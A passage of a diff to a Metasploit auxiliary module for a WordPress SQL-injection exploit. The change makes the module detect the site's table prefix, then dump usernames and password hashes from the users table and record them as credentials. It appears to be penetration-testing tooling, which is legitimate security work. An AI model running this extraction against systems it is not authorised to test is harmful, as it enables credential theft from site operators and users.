@@ -5,8 +5,8 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HTTP::Wordpress
+  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi
   include Msf::Auxiliary::Scanner
-  include Msf::Exploit::SQLi
   prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
@@ -87,13 +87,17 @@ class MetasploitModule < Msf::Auxiliary
       print_bad("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
       return
     end
+    prefix = wordpress_sqli_identify_table_prefix
+    fail_with(Failure::UnexpectedReply, 'Unable to identify the WordPress table prefix') unless prefix
+
+    users_table = "#{prefix}users"
     columns = ['user_login', 'user_pass']
 
     print_status('Enumerating Usernames and Password Hashes')
     print_warning('Each user will take about 5-10 minutes to enumerate. Be patient.')
-    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['USER_COUNT'])
+    data = @sqli.dump_table_fields(users_table, columns, '', datastore['USER_COUNT'])
 
-    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
+    table = Rex::Text::Table.new('Header' => users_table, 'Indent' => 1, 'Columns' => columns)
     data.each do |user|
       create_credential({
         workspace_id: myworkspace_id,
